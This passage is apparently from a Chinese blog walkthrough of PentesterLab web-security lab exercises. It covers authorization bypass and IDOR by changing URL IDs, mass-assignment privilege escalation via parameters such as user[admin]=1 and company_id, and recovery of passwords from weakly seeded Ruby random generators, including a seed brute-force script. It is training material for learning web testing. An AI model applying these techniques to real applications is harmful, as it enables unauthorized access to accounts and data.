<span class="hljs-string">&quot;html.parser&quot;</span>)<br>        form = soup.select(<span class="hljs-string">&quot;form&quot;</span>)[<span class="hljs-number">0</span>].text.strip()<br>        <span class="hljs-built_in">print</span>(form)<br><br>        <span class="hljs-comment"># 使用正则表达式匹配数学表达式</span><br>        captcha_match = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;(\d+[+\-*/]\d+)\s*=&quot;</span>, form)<br>        <span class="hljs-keyword">if</span> captcha_match:<br>            expression = captcha_match.group(<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Expression:&quot;</span>, expression)<br><br>            <span class="hljs-comment"># 计算数学表达式结果</span><br>            <span class="hljs-keyword">try</span>:<br>                result = <span class="hljs-built_in">eval</span>(expression)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Result:&quot;</span>, result)<br><br>                <span class="hljs-comment"># 发送包含计算结果的 POST 请求</span><br>                post_response = ss.get(post_url.<span class="hljs-built_in">format</span>(result)).text<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> post_response:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] OK\n&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error in submitting result\n&quot;</span>)<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error in evaluating expression:&quot;</span>, <span class="hljs-built_in">str</span>(e), <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    captcha9()<br></code></pre></td></tr></table></figure>
<h1>0x05 Authorization-授权</h1>
<p>官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">授权问题在 Web 应用程序中非常常见。本节汇总了一些常见的漏洞示例。现代 Web 开发框架通常可以防止各种注入，但无法自动处理此类问题，因为它们无法理解其背后的业务逻辑。出于同样的原因，自动网络扫描仪无法真正测试授权问题；这就是为什么它通常是漏洞的良好来源，并且了解如何测试它们很重要。下面的“批量分配”部分也是一个授权问题，但为了清楚起见，我更喜欢将练习分成两个部分。<br></code></pre></td></tr></table></figure>
<h2 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example-1-4"></a>Example 1</h2>
<p class='item-img' data-src='image-20231217172534021.png'><img src="image-20231217172534021.png" alt="image-20231217172534021"></p>
<p>那我们先登录一下看看</p>
<p class='item-img' data-src='image-20231217172957505.png'><img src="image-20231217172957505.png" alt="image-20231217172957505"></p>
<p>发现了有关user1用户的两个隐私，根据题意我们可以换一个其他浏览器，或者直接注销用户，接着直接访问下隐私的url地址，看看是否要求我们进行用户身份验证。</p>
<p class='item-img' data-src='image-20231217172841476.png'><img src="image-20231217172841476.png" alt="image-20231217172841476"></p>
<p class='item-img' data-src='image-20231217172911536.png'><img src="image-20231217172911536.png" alt="image-20231217172911536"></p>
<p>可见我们并未登录，但仍可以访问uer1用户的隐私</p>
<p class='item-img' data-src='image-20231217172853013.png'><img src="image-20231217172853013.png" alt="image-20231217172853013"></p>
<p>看一手官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在此示例中，您可以使用以下用户登录： user1 ，密码为“pentesterlab”。登录并尝试后，请注销并尝试访问相同的信息。<br><br>对于设计不佳的 Web 应用程序来说，这是一个非常常见的问题，即使您无法访问身份验证后页面，如果您知道其他页面的 URL，您仍然可以访问其他页面：http://vulnerable/authorization/example1/infos/1例如。<br></code></pre></td></tr></table></figure>
<h2 id="Example-2-4"><a href="#Example-2-4" class="headerlink" title="Example-2-4"></a>Example 2</h2>
<p class='item-img' data-src='image-20231217173432149.png'><img src="image-20231217173432149.png" alt="image-20231217173432149"></p>
<p>要求我们访问user2的信息，我们先登陆看看</p>
<p class='item-img' data-src='image-20231217173456304.png'><img src="image-20231217173456304.png" alt="image-20231217173456304"></p>
<p>这里有点懵逼，并不知道要做什么，看一手官方解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在此示例中，您可以使用以下用户登录： `user1` ，密码为 `pentesterlab` 。登录后，您可以开始访问信息并查看使用的模式： `/infos/1` 、 `/infos/2` 。如果不断增加 URL 中的数字，您就可以访问其他用户的信息。<br></code></pre></td></tr></table></figure>
<p>那我们修改看看</p>
<p class='item-img' data-src='image-20231217173532840.png'><img src="image-20231217173532840.png" alt="image-20231217173532840"></p>
<p class='item-img' data-src='image-20231217173541894.png'><img src="image-20231217173541894.png" alt="image-20231217173541894"></p>
<p>可见我们增加url后面的数字，实现了水平越权</p>
<h2 id="Example-3-4"><a href="#Example-3-4" class="headerlink" title="Example-3-4"></a>Example 3</h2>
<p class='item-img' data-src='image-20231217173623056.png'><img src="image-20231217173623056.png" alt="image-20231217173623056"></p>
<p>我们继续登录看看</p>
<p class='item-img' data-src='image-20231217173726599.png'><img src="image-20231217173726599.png" alt="image-20231217173726599"></p>
<p>如上图，发现多了一个edit编辑的功能</p>
<p class='item-img' data-src='image-20231217173758026.png'><img src="image-20231217173758026.png" alt="image-20231217173758026"></p>
<p>这里有了上一关的经验，我想着直接修改数字1看看</p>
<p class='item-img' data-src='image-20231217173822490.png'><img src="image-20231217173822490.png" alt="image-20231217173822490"></p>
<p>果不其然，这里成为了user2用户</p>
<p class='item-img' data-src='image-20231217173857155.png'><img src="image-20231217173857155.png" alt="image-20231217173857155"></p>
<p>看一手官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在此示例中，您可以使用类似于前面看到的方法来访问信息。您不能直接访问信息，但是您可以看到您现在可以编辑信息，并且您可以使用此功能仅通过增加 URL 中的数字来访问其他用户的信息。<br></code></pre></td></tr></table></figure>
<h1>0x06 Mass Assignment-覆盖属性</h1>
<p>官方说明：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">当人们开始使用数据库来存储信息来构建网站时，他们必须手动执行大量 <span class="hljs-variable constant_">SQL</span>。很少有人意识到这不是最好的解决方案，并开始研究更智能的替代方案，并开始构建对象关系映射 (<span class="hljs-variable constant_">ORM</span>)，以便在没有任何 <span class="hljs-variable constant_">SQL</span> 知识的情况下轻松查询数据库。例如，在 <span class="hljs-title class_">Ruby</span>（使用 <span class="hljs-title class_">ActiveRecord</span>）中，您可以执行以下操作：<br><br><span class="hljs-variable">@user</span> = <span class="hljs-title class_">User</span>.find_by_name(<span class="hljs-string">&#x27;pentesterlab&#x27;</span>)<br>这将自动生成并执行查询，并在 <span class="hljs-title class_">User</span> 对象中检索结果。<br><br>另一个非常方便的用法是从哈希自动创建和更新对象：<br><br><span class="hljs-variable">@user</span> = <span class="hljs-title class_">User</span>.create(myhash) <br>[...]<br><span class="hljs-variable">@user</span>.update_attributes(anotherhash)<br><br>不幸的是，这个有用的功能是有安全代价的，如果开发人员没有正确确保对象 <span class="hljs-variable">@user</span> 的属性受到保护，攻击者就可以任意覆盖这些属性中的任何一个。在本节中，我们将看到此类问题的一些常见示例： 覆盖属性<br></code></pre></td></tr></table></figure>
<h2 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example-1-5"></a>Example 1</h2>
<p class='item-img' data-src='image-20231217174500332.png'><img src="image-20231217174500332.png" alt="image-20231217174500332"></p>
<p>这里依旧是一脸懵的，还是看一手官方解释吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在此示例中，您可以注册一个用户。该应用程序有两个级别的权限：<br>        User. <br>        Admin. <br><br>管理员权限是使用对象 user 上的属性 admin 设置的。如果您仔细观察 Web 应用程序使用的格式： user[username] 和 user[password] ，您应该能够找到一种获取 admin 访问权限的方法。可以使用三种方法：<br>	使用浏览器扩展直接修改页面。<br>	保存页面并离线修改以创建一个页面，该页面将正确的负载发送到正确的 URL。<br>	使用代理拦截合法请求并添加您的参数（最快的选项）。<br></code></pre></td></tr></table></figure>
<p>一开始看这个解释并不清楚是干嘛的，于是看了师傅们的wp才理解。根据之前官方的解释，这里极有可能是服务器会对用户在url输入的内容进行检索，我们抓包看一下数据结构</p>
<p class='item-img' data-src='image-20231217175253725.png'><img src="image-20231217175253725.png" alt="image-20231217175253725"></p>
<p>可以看到是<code>user[username]与user[password]</code>结构，这意味着服务器就是通过检索url中user中键值名为username与password对应的值。也就是说我们可以尝试在url中添加：user[admin]的参数。</p>
<p class='item-img' data-src='image-20231217175707342.png'><img src="image-20231217175707342.png" alt="image-20231217175707342"></p>
<p>如上图，这里我添加了<code>user[admin]=1</code>，可以看到成功越权</p>
<h2 id="Example-2-5"><a href="#Example-2-5" class="headerlink" title="Example-2-5"></a>Example 2</h2>
<p class='item-img' data-src='image-20231217175813146.png'><img src="image-20231217175813146.png" alt="image-20231217175813146"></p>
<p>这里目的相同，不过我们在创建的时候无法添加admin属性了</p>
<p class='item-img' data-src='image-20231217180552517.png'><img src="image-20231217180552517.png" alt="image-20231217180552517"></p>
<p>但这里多了一个功能，我们可以进行更新</p>
<p class='item-img' data-src='image-20231217180617725.png'><img src="image-20231217180617725.png" alt="image-20231217180617725"></p>
<p>在此url下我们继续提交看看</p>
<p class='item-img' data-src='image-20231217180632764.png'><img src="image-20231217180632764.png" alt="image-20231217180632764"></p>
<p>发现这里变成更新了，那我们有理由相信，这位开发人员只在登录的时候进行了限制，但其他接口忘记修改了。那这样的话我们在此尝试添加admin属性看看</p>
<p class='item-img' data-src='image-20231217180722350.png'><img src="image-20231217180722350.png" alt="image-20231217180722350"></p>
<p>成功越权</p>
<h2 id="Example-3-5"><a href="#Example-3-5" class="headerlink" title="Example-3-5"></a>Example 3</h2>
<p class='item-img' data-src='image-20231217180752017.png'><img src="image-20231217180752017.png" alt="image-20231217180752017"></p>
<p>我们先尝试登录</p>
<p class='item-img' data-src='image-20231218134748802.png'><img src="image-20231218134748802.png" alt="image-20231218134748802"></p>
<p>这里说公司一的用户是无权访问公司2的秘密的，但这里我们可以看到有一个modify的新功能，不出所料这里或许是漏洞所在点</p>
<p class='item-img' data-src='image-20231218140715821.png'><img src="image-20231218140715821.png" alt="image-20231218140715821"></p>
<p>我们点击在输入框输入信息后发现url成为了updateprofile，那大概率如果我们在此添加一些属性，也许就可以绕过，但我测试了几番发现总是错误。让我们看一下官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在本练习中，您可以使用以下用户登录： user1 ，密码为 pentesterlab 。登录后，尝试访问“Company 2”公司的信息。<br><br>为此，您需要使用批量分配来修改您的公司。<br><br>按照约定（可以通过编程方式更改），当开发人员使用 ActiveRecord（Ruby-on-Rails 最常见的数据映射器）并且类 Company 具有多个 User 时，关系将受到管理在 User 类中的字段 company_id ：<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231218141037381.png'><img src="image-20231218141037381.png" alt="image-20231218141037381"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby">在 <span class="hljs-title class_">Ruby</span> 中使用以下代码：<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &lt; <span class="hljs-title class_ inherited__">ActiveRecord::Base</span><br>  belongs_to <span class="hljs-symbol">:company</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Company</span> &lt; <span class="hljs-title class_ inherited__">ActiveRecord::Base</span><br>  has_many <span class="hljs-symbol">:users</span><br><span class="hljs-keyword">end</span><br><span class="hljs-title class_">Ruby</span>-on-<span class="hljs-title class_">Rails</span> 强制执行“约定”而不是“配置”，这确实有助于猜测类名称和属性名称......<br>使用此信息，您应该能够修改您当前的公司以获取其他公司的“秘密”。获得此“秘密”后，您可以重置 company_id 以返回您公司的详细信息。<br></code></pre></td></tr></table></figure>
<p>附上GPT对上述代码的解释</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ruby">这段 <span class="hljs-title class_">Ruby</span> 代码展示了两个 <span class="hljs-title class_">ActiveRecord</span> 模型类，分别是 <span class="hljs-string">`User`</span> 和 <span class="hljs-string">`Company`</span>。<span class="hljs-title class_">ActiveRecord</span> 是 <span class="hljs-title class_">Ruby</span> on <span class="hljs-title class_">Rails</span> 中的 <span class="hljs-variable constant_">ORM</span>（对象关系映射）框架，用于在 <span class="hljs-title class_">Ruby</span> 中操作数据库。<br><br><span class="hljs-number">1</span>. <span class="hljs-title class_">User</span> 模型类:<br><br><span class="hljs-string">``</span><span class="hljs-string">`ruby</span><br><span class="hljs-string">class User &lt; ActiveRecord::Base</span><br><span class="hljs-string">  belongs_to :company</span><br><span class="hljs-string">end</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>- <span class="hljs-string">`User`</span> 类继承自 <span class="hljs-string">`ActiveRecord::Base`</span>，表示它是一个 <span class="hljs-title class_">ActiveRecord</span> 模型。<br>- <span class="hljs-string">`belongs_to :company`</span> 表明 <span class="hljs-string">`User`</span> 模型属于（关联到）<span class="hljs-string">`Company`</span> 模型。这是一对多关系的一端，即一个公司可以有多个用户，而每个用户只属于一个公司。<br><br><span class="hljs-number">2</span>. <span class="hljs-title class_">Company</span> 模型类:<br><br><span class="hljs-string">``</span><span class="hljs-string">`ruby</span><br><span class="hljs-string">class Company &lt; ActiveRecord::Base</span><br><span class="hljs-string">  has_many :users</span><br><span class="hljs-string">end</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>- <span class="hljs-string">`Company`</span> 类同样继承自 <span class="hljs-string">`ActiveRecord::Base`</span>，表示它是一个 <span class="hljs-title class_">ActiveRecord</span> 模型。<br>- <span class="hljs-string">`has_many :users`</span> 表明 <span class="hljs-string">`Company`</span> 模型拥有（关联到）多个 <span class="hljs-string">`User`</span> 模型。这是一对多关系的多端，即一个公司可以拥有多个用户。<br><br>这两个类的定义反映了数据库中两个表之间的关系。通常，这种关系被称为 <span class="hljs-string">&quot;一对多&quot;</span>（<span class="hljs-title class_">One</span>-to-<span class="hljs-title class_">Many</span>）关系，其中一个对象（<span class="hljs-title class_">Company</span>）可以关联到多个其他对象（<span class="hljs-title class_">Users</span>），而这些其他对象（<span class="hljs-title class_">Users</span>）只能属于一个特定的对象（<span class="hljs-title class_">Company</span>）。<br><br>在 <span class="hljs-title class_">Rails</span> 中，这样的关联关系还可以带来一些便捷的方法，比如通过 <span class="hljs-string">`company.users`</span> 可以获取与某个公司关联的所有用户，通过 <span class="hljs-string">`user.company`</span> 可以获取某个用户所属的公司。这些关联关系可以方便地进行数据库查询和操作，遵循 <span class="hljs-title class_">Rails</span> 的约定优于配置（<span class="hljs-title class_">Convention</span> over <span class="hljs-title class_">Configuration</span>）原则。<br></code></pre></td></tr></table></figure>
<p>但此处的<code>当开发人员使用 ActiveRecord（Ruby-on-Rails 最常见的数据映射器）</code>这个映射器我们从何验证呢，只需要一个小插件即可</p>
<p class='item-img' data-src='image-20231218141415491.png'><img src="image-20231218141415491.png" alt="image-20231218141415491"></p>
<p>总结：因为在一对多的结构中，即一个company对应多个user，那么在user表中会多一个company_id的外键指向company表。</p>
<p>这也就是说我们可以从刚才的页面添加一个<code>compan_id</code>的属性即可，而之前我在测试的时候添加的是company属性</p>
<p>如下图，我们成功读取公司一的秘密</p>
<p class='item-img' data-src='image-20231218141629584.png'><img src="image-20231218141629584.png" alt="image-20231218141629584"></p>
<h1>0x07 Randomness Issues-随机性问题</h1>
<p>官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">根据开发人员生成随机数或字符串的方式，所创建的值或多或少都是随机的。最大的错误便是使用常量或当前时间手动设置随机生成器;这将允许攻击者能够预测已经和将要生成的值。<br><br>在本节中，我们将看到一些示例，这些示例将使您相信随机并不总是随机的。<br></code></pre></td></tr></table></figure>
<h2 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example-1-6"></a>Example 1</h2>
<p class='item-img' data-src='image-20231218141952510.png'><img src="image-20231218141952510.png" alt="image-20231218141952510"></p>
<p>附上GPT对上述代码的解释：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ruby">这段 <span class="hljs-title class_">Ruby</span> 代码主要涉及随机密码生成和创建用户的操作，同时使用了 <span class="hljs-variable constant_">MD5</span> 哈希来存储密码。以下是对代码的详细解释：<br><br><span class="hljs-number">1</span>. **<span class="hljs-string">`Random.new(0)`</span>**: 创建了一个新的伪随机数生成器对象，并使用种子值 <span class="hljs-string">`0`</span> 进行初始化。这个对象将用于生成密码中的随机字符。<br><br><span class="hljs-number">2</span>. **<span class="hljs-string">`6.times.map &#123;...&#125;.join`</span>**: 这个部分生成了一个包含 <span class="hljs-number">6</span> 个随机小写字母的字符串。具体解释如下：<br><br>   - <span class="hljs-string">`6.times`</span>: 表示循环 <span class="hljs-number">6</span> 次。<br>   - <span class="hljs-string">`map &#123;...&#125;`</span>: 对每次循环应用花括号中的代码块，并将结果存储在数组中。<br>   - <span class="hljs-string">`(&#x27;a&#x27;..&#x27;z&#x27;).to_a`</span>: 创建包含小写字母 <span class="hljs-string">&#x27;a&#x27;</span> 到 <span class="hljs-string">&#x27;z&#x27;</span> 的数组。<br>   - <span class="hljs-string">`s.rand((&#x27;a&#x27;..&#x27;z&#x27;).to_a.size)`</span>: 生成一个介于 <span class="hljs-number">0</span> 和数组大小之间的随机数。<br>   - 整体来说，<span class="hljs-string">`(&#x27;a&#x27;..&#x27;z&#x27;).to_a[s.rand((&#x27;a&#x27;..&#x27;z&#x27;).to_a.size)]`</span> 会随机选择数组中的一个字母。<br>   - <span class="hljs-string">`.join`</span>: 将数组中的元素拼接成一个字符串。<br><br><span class="hljs-number">3</span>. **<span class="hljs-string">`Digest::MD5.hexdigest(SEED+pass+SEED)`</span>**: 使用 <span class="hljs-variable constant_">MD5</span> 哈希算法对密码进行哈希。<span class="hljs-string">`Digest::MD5.hexdigest`</span> 将生成一个 <span class="hljs-number">32</span> 位的十六进制哈希值。<span class="hljs-string">`SEED`</span> 是一个预定义的常量，被拼接到密码的前后，这样可以增加哈希的安全性，防止彩虹表等攻击。<br><br><span class="hljs-number">4</span>. **<span class="hljs-string">`User.create(...)`</span>**: 使用 <span class="hljs-title class_">ActiveRecord</span> 模型 <span class="hljs-string">`User`</span> 的 <span class="hljs-string">`create`</span> 方法创建用户。具体解释如下：<br><br>   - <span class="hljs-string">`:username =&gt; &#x27;admin&#x27;`</span>: 指定用户名为 <span class="hljs-string">&#x27;admin&#x27;</span>。<br>   - <span class="hljs-string">`:password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)`</span>: 指定密码为通过 <span class="hljs-variable constant_">MD5</span> 哈希处理的随机生成的密码。<br><br><span class="hljs-number">5</span>. **<span class="hljs-string">`pass = 6.times.map &#123;...&#125;.join`</span>**: 生成另一个 <span class="hljs-number">6</span> 位的随机密码，用于创建第二个用户。<br><br><span class="hljs-number">6</span>. **<span class="hljs-string">`User.create(...)`</span>**: 创建第二个用户，用户名为 <span class="hljs-string">&#x27;hacker&#x27;</span>，密码同样是通过 <span class="hljs-variable constant_">MD5</span> 哈希处理的随机生成的密码。<br><br>总体来说，这段代码用于创建两个用户，一个用户名为 <span class="hljs-string">&#x27;admin&#x27;</span>，另一个用户名为 <span class="hljs-string">&#x27;hacker&#x27;</span>，并为这两个用户生成随机密码，通过 <span class="hljs-variable constant_">MD5</span> 哈希存储密码。在实际应用中，使用更强大的密码哈希算法（如 bcrypt）通常是更安全的选择。此外，硬编码的密码和种子值可能不是最佳实践，更好的方式是使用更随机和更长的密码以及真正的随机数生成器。<br></code></pre></td></tr></table></figure>
<p>也就是说这里面用户的密码是随机生成的，但我们可以看到其中的随机数种子<code>s=Random.new(0)</code>似乎并不安全，这里以0为随机数种子，这代表着此处的s一定是定值，并且在进行md5加密时，采用了预定义常量<code>MD5.hexdigest(SEED+pass+SEED))</code>SEED</p>
<p>我们看一下官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">第一个例子只是为了说明随机性并不是真正的随机性。问题来自于种子随机生成器的使用。开发人员使用值 0 来为随机生成器提供种子。<br><br>如果您只是重新执行该脚本，您应该能够找到为管理员 admin 生成的密码。<br></code></pre></td></tr></table></figure>
<p>之后看了几个wp发现直接运行此代码即可</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">s = <span class="hljs-title class_">Random</span>.new(<span class="hljs-number">0</span>)<br>pass = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[s.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br>puts pass<br>pass = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[s.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br>puts pass<br></code></pre></td></tr></table></figure>
<p>但令我疑惑的是<code>password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)</code>此处的password起到了什么作用啊。难道不应该是puts password吗？于是问了GPT，这里附上解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">是的，你理解得很对。在这段 Ruby 代码中，`password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)` 中的 `password` 只是用于存储密码的字段，实际存储的是通过 MD5 哈希算法处理过的密码的结果，而不是用户真正的明文密码。<br><br>在典型的安全实践中，用户的密码是不直接以明文形式存储在数据库中的，而是通过哈希算法加盐处理后存储。这样即使数据库泄漏，攻击者也不能轻易获取用户的真实密码。盐值（`SEED` 在这里就是一种盐值）是一个额外的随机字符串，通过与用户密码结合，增加了哈希的随机性和安全性。<br><br>需要注意的是，MD5 已经不再被认为是足够安全的哈希算法，因为它容易受到碰撞攻击。在实际应用中，推荐使用更强大和安全的哈希算法，如 SHA-256 或 SHA-3，并且结合足够长、随机的盐值来存储用户密码。<br></code></pre></td></tr></table></figure>
<p>那我们找一个Ruby的在线运行工具运行一下即可</p>
<p class='item-img' data-src='image-20231218145027168.png'><img src="image-20231218145027168.png" alt="image-20231218145027168"></p>
<p>如上图，多次尝试你会发现，右侧结果不会改变，那admin的密码就是第一个了，如下图success</p>
<p class='item-img' data-src='image-20231218145107439.png'><img src="image-20231218145107439.png" alt="image-20231218145107439"></p>
<h2 id="Example-2-6"><a href="#Example-2-6" class="headerlink" title="Example-2-6"></a>Example 2</h2>
<p class='item-img' data-src='image-20231218145638298.png'><img src="image-20231218145638298.png" alt="image-20231218145638298"></p>
<p>在这里呢与上一关相似，只不过随机数种子换为了当前时间戳。这令我头疼，我以为页面会在某处泄露一下时间的，但我找不到，那看一下官方说明吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">此示例显示了随机生成器播种不良的另一个示例。随机生成器以当前时间为种子。<br><br>要获取 admin 密码，您需要暴力破解种子。为此，您可以从当前时间开始并减少时间，同时重新执行用于生成值的算法，直到获得密码。<br><br>一旦获得密码，您就知道使用了什么种子（或者更准确地说，随机生成器初始化的时间）。然后您可以获得 admin 密码。<br></code></pre></td></tr></table></figure>
<p>原来如此，学到了，不过我这都2023年了，爆破估计很费事，这里先贴上大佬的脚本让他自己先去爆破吧</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">timestamp = (<span class="hljs-title class_">Time</span>.now.to_f).to_i<br>seed = <span class="hljs-title class_">Random</span>.new(timestamp)<br>pass_admin = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[seed.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br>pass_hacker = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[seed.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br><br><span class="hljs-keyword">while</span> pass_hacker !=<span class="hljs-string">&quot;efefsk&quot;</span> <span class="hljs-keyword">do</span> <span class="hljs-comment">#contraseña del usuario &#x27;hacker&#x27;</span><br> timestamp = timestamp - <span class="hljs-number">1</span><br> seed = <span class="hljs-title class_">Random</span>.new(timestamp)<br> pass_admin = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[seed.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br> pass_hacker = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[seed.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br><span class="hljs-keyword">end</span><br><br>puts <span class="hljs-string">&quot;Password de admin: &quot;</span><br>puts pass_admin<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231218153951740.png'><img src="image-20231218153951740.png" alt="image-20231218153951740"></p>
<p>最终也是成功爆破出来</p>
<p class='item-img' data-src='image-20231218153934440.png'><img src="image-20231218153934440.png" alt="image-20231218153934440"></p>
<h2 id="Example-3-6"><a href="#Example-3-6" class="headerlink" title="Example-3-6"></a>Example 3</h2>
<p class='item-img' data-src='image-20231218151916877.png'><img src="image-20231218151916877.png" alt="image-20231218151916877"></p>
<p>这里看到s恢复了以0位随机数种子，但生成密码的时候出现了<code>6+s.rand(5)</code>这似乎是随机增加了密码的位数，这似乎增加了爆破难度，让我们看看官方说明</p>
